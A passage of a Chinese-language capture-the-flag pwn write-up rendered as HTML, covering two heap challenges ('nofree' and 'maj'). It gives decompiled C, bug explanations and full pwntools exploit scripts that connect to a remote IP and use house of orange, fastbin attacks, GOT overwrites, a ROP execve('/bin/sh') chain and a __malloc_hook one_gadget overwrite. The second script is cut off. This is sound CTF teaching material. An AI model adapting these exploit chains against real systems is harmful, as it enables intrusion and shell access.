class="line">  <span class="built_in">memset</span>(chunk_array, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"content: "</span>);</span><br><span class="line">  read_str(chunk_array, a1);</span><br><span class="line">  <span class="keyword">return</span> strdup(chunk_array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 一个<code>edit</code>：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_idx();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)&amp;chunk_array[<span class="number">16</span> * (<span class="keyword">int</span>)result + <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"content: "</span>);</span><br><span class="line">      result = read_str(*(<span class="keyword">void</span> **)&amp;chunk_array[<span class="number">16</span> * v1 + <span class="number">256</span>], *(_QWORD *)&amp;chunk_array[<span class="number">16</span> * v1 + <span class="number">264</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>显然这里<code>add</code>功能里输入的size，和<code>strdup</code>实际<code>malloc</code>出来的size并不一定是对应的，所以在<code>edit</code>的时候可以有heap overflow。</p></li><li><p>无<code>free</code>，就直接house of orange了，不过这里是把top chunk扔到<code>0x70</code>的fastbin里面去，然后利用heap overflow改fd指向bss上chunk array的地方，size是可以通过<code>new</code>功能那里控制的，正好可以控制分配到<code>chunk[1]</code>的位置而且不破坏<code>chunk[0]</code>，从而达到任意地址写。</p></li><li><p>因为同样没有<code>show</code>，这里我的思路是：</p><ul><li>改<code>atoi_got</code>为<code>printf_plt</code>，并且把<code>exit_got</code>改为<code>ret</code>，这样就可以利用<code>atoi</code>引入格式化字符串漏洞，同时<code>choice</code>错误的情况下能继续执行程序而不exit。</li><li>然后利用格式化字符串漏洞把<code>libc_read</code>和<code>stack address</code>全leak出来。</li></ul></li><li><p>由于查不到libc的版本，所以只能后面的思路就是想办法打syscall，但是ROPgadget是搜不到syscall的。这里就利用<code>libc_read + 0xe</code>的地方就是一个<code>syscall</code>的gadget，来进行后续的syscall调用。</p></li><li><p>至于<code>rdi</code>，<code>rsi</code>，<code>rdx</code>可以通过通用gadget控制，最关键的是<code>rax</code>，这里采用调用<code>read</code>的方法，因为函数的返回值等于读入的字符串的长度，所以只要控制读入<code>0x3b</code>长度字符串，就控制<code>rax = 0x3b</code>了。</p></li><li><p>最后就直接构造rop，利用任意地址写覆盖<code>edit</code>的返回地址即可。</p></li><li><p>拿完shell直接查靶机的libc：<code>Ubuntu GLIBC 2.23-0ubuntu11.2</code>，后面方便很多。</p></li><li><p>exp仅供参考：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'101.200.53.148'</span>, <span class="number">12301</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_s</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"choice&gt;&gt; "</span>, <span class="string">"1\x00"</span>)</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"idx: "</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">"idx: "</span>, <span class="string">"1"</span> * idx + <span class="string">'\x00'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, <span class="string">"%"</span> + str(size) + <span class="string">"c"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx: "</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_s</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"choice&gt;&gt; "</span>, <span class="string">"11\x00"</span>)</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"idx: "</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">"idx: "</span>, <span class="string">"1"</span> * idx + <span class="string">"\x00"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">exit_got = elf.got[<span class="string">'exit'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">ret = <span class="number">0x00000000004006b9</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack chunk array</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">"AAA\x00"</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0xfe1</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">"B"</span> * <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">"A"</span> * <span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">"A"</span> * <span class="number">0x88</span> + p64(<span class="number">0x81</span>))</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x38</span> + p64(<span class="number">0x81</span>) + p64(<span class="number">0x6020C0</span> + <span class="number">0x100</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x81</span>, <span class="string">"A"</span> * <span class="number">0x77</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x81</span>, <span class="string">"A"</span> * <span class="number">0x77</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write atoi_got table</span></span><br><span class="line">edit(<span class="number">0</span>, p64(atoi_got) + p64(<span class="number">0x100</span>))</span><br><span class="line">edit(<span class="number">1</span>, p64(printf_plt))</span><br><span class="line">edit_s(<span class="number">0</span>, p64(exit_got) + p64(<span class="number">0x100</span>))</span><br><span class="line">edit_s(<span class="number">1</span>, p64(ret))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak read to get syscall gadget</span></span><br><span class="line">payload = <span class="string">"%7$s%8$s"</span> + p64(read_got) + p64(printf_got)</span><br><span class="line">p.sendlineafter(<span class="string">"choice&gt;&gt; "</span>, payload)</span><br><span class="line">libc_read = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">syscall = libc_read + <span class="number">0xE</span></span><br><span class="line">libc_printf = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">payload = <span class="string">"%12$p"</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice&gt;&gt; "</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">stack_addr = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write gadget</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c23</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000400c21</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line"></span><br><span class="line">gadget_1 = <span class="number">0x400C00</span></span><br><span class="line">gadget_2 = <span class="number">0x400C16</span></span><br><span class="line"></span><br><span class="line">edit_s(<span class="number">0</span>, p64(stack_addr + <span class="number">8</span>) + p64(<span class="number">0x300</span>) + <span class="string">"/bin/sh\x00"</span> + p64(syscall))</span><br><span class="line">payload = flat([pop_rdi, <span class="number">0</span>, pop_rsi, stack_addr + <span class="number">0xB8</span>, <span class="number">0</span>, libc_read]) <span class="comment"># control rax</span></span><br><span class="line">payload += flat([gadget_2, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0x6020C0</span>  + <span class="number">0x128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x6020C0</span> + <span class="number">0x120</span>])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">edit_s(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.send(<span class="string">'A'</span> * <span class="number">0x3b</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400C00 loc_400C00: </span></span><br><span class="line"><span class="string">.text:0000000000400C00                 mov     rdx, r13</span></span><br><span class="line"><span class="string">.text:0000000000400C03                 mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400C06                 mov     edi, r15d</span></span><br><span class="line"><span class="string">.text:0000000000400C09                 call    qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:0000000000400C0D                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400C11                 cmp     rbx, rbp</span></span><br><span class="line"><span class="string">.text:0000000000400C14                 jnz     short loc_400C00</span></span><br><span class="line"><span class="string">.text:0000000000400C16</span></span><br><span class="line"><span class="string">.text:0000000000400C16 loc_400C16:                             ; CODE XREF: init+34↑j</span></span><br><span class="line"><span class="string">.text:0000000000400C16                 add     rsp, 8</span></span><br><span class="line"><span class="string">.text:0000000000400C1A                 pop     rbx</span></span><br><span class="line"><span class="string">.text:0000000000400C1B                 pop     rbp</span></span><br><span class="line"><span class="string">.text:0000000000400C1C                 pop     r12</span></span><br><span class="line"><span class="string">.text:0000000000400C1E                 pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000400C20                 pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000400C22                 pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000400C24                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_read: "</span> + hex(libc_read))</span><br><span class="line">success(<span class="string">"libc_printf: "</span> + hex(libc_printf))</span><br><span class="line">success(<span class="string">"stack_addr: "</span> + hex(stack_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="maj"><a href="#maj" class="headerlink" title="maj"></a>maj</h1><ol><li><p>比较常规的利用方法，给了四个功能实际上只有三个有效，分别是：</p><ul><li><p><code>add</code>功能：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"please answer the question\n"</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%d"</span>, &amp;v8);</span><br><span class="line"><span class="keyword">if</span> ( !sub_400B2B(v8) )</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"you are right\n"</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; buf[i]; ++i )</span><br><span class="line">;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"full!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"______?"</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line"><span class="keyword">if</span> ( v7 &gt;= <span class="number">0</span> &amp;&amp; v7 &lt;= <span class="number">4096</span> )</span><br><span class="line">&#123;</span><br><span class="line">    buf[i] = <span class="built_in">malloc</span>(v7);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"start_the_game,yes_or_no?"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;unk_603060, <span class="number">0x100</span>uLL);</span><br><span class="line">    ......</span><br><span class="line">    <span class="built_in">snprintf</span>(byte_6033E0, v7, <span class="string">"%s"</span>, &amp;unk_603060);<span class="comment">// here</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="built_in">size</span>[i] = v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">size</span>[i] = v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  中间那部分基本不用管（整个过程下来没有影响），那个<code>answer question</code>只要简单爆一下就能知道80这个数字可用，后面基本就是根据输入的size去<code>malloc</code>一个chunk，然后通过<code>snprintf</code>把输入写到chunk里面，size写到bss上。</p></li><li><p><code>delete</code>:</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"index ?"</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line"><span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> &amp;&amp; v3 &lt;= <span class="number">31</span> &amp;&amp; buf[v3] )</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="built_in">free</span>(buf[v3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  中间逻辑一样不用管，就是个直接<code>free</code>没有清空指针。</p></li><li><p><code>edit</code>：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index ?"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> &amp;&amp; v3 &lt;= <span class="number">31</span> &amp;&amp; buf[v3] )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"__new_content ?"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( val_100 &lt;= val_0 )</span><br><span class="line">      v0 = dword_603040;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v0 = val_0;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= val_100 &amp;&amp; val_0 &gt; dword_603040 || dword_603040 &lt;= val_0 )</span><br><span class="line">      v1 = val_0;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     v1 = dword_603040;</span><br><span class="line">        val_0 = v1;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf[v3], <span class="built_in">size</span>[v3]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"done"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"invalid index"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>显然这里存在一个uaf，直接先通过uaf，形成chunk overlap，使得同一个chunk同时存在于unsorted bin和fastbin（<code>size = 0x70</code>）中，这样<code>fastbin-&gt;fd = main_arena + 0x58</code>。</p></li><li><p>由于没有<code>show</code>，通用的办法就是通过上述构造，对<code>fastbin-&gt;fd</code>进行partial write 2 byte，所以只要bruteforce 4 bits，就能通过fastbin attack分配到<code>stdout</code>结构体的上方，然后将:</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line">_IO_read_ptr = <span class="number">0</span></span><br><span class="line">_IO_read_end = <span class="number">0</span></span><br><span class="line">_IO_read_base = <span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span>xXXXXXXXXXXXXXX00</span><br></pre></td></tr></table></figure><p> 就能leak出缓冲区的内存，从而leak出libc地址。</p></li><li><p>由于通过nofree那题拿到了libc版本，所以后面就是利用uaf打<code>__malloc_hook</code>为<code>onegadget</code>即可。</p></li><li><p>exp仅供参考：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'101.200.53.148'</span>, <span class="number">15423</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"please answer the question"</span>, str(num))</span><br><span class="line">    p.sendlineafter(<span class="string">'______?'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"start_the_game,yes_or_no?"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index ?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index ?"</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"__new_content ?"</span>, content)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x28</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x28</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x28</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            add(<span class="number">80</span>, <span class="number">0x68</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 3 4 5 6</span></span><br><span class="line"></span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># chunk overlap</span></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">'\x10'</span>)</span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x28</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 7</span></span><br><span class="line">        edit(<span class="number">7</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)) * <span class="number">2</span>)</span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x28</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 8</span></span><br><span class="line">        edit(<span class="number">8</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0xd1</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># unsorted bin</span></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x58</span>, <span class="string">"FFFF"</span>) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># bruteforce 4 bits</span></span><br><span class="line">        edit(<span class="number">3</span>, <span class="string">"\xdd\x55"</span>)</span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x68</span>, <span class="string">"GGGG"</span>) <span class="comment"># chunk 10</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak</span></span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x68</span>, <span class="string">"HHHH"</span>) <span class="comment"># chunk 11</span></span><br><span class="line">        edit(<span class="number">11</span>, <span class="string">"\x00"</span> * <span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">"\x00"</span>)</span><br><span class="line">        p.recvline()</span><br><span class="line">        p.recv(<span class="number">0x40</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x3c5600</span></span><br><span class="line">        __malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">        one_gadget = libc_base + one_gadget_offset</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span 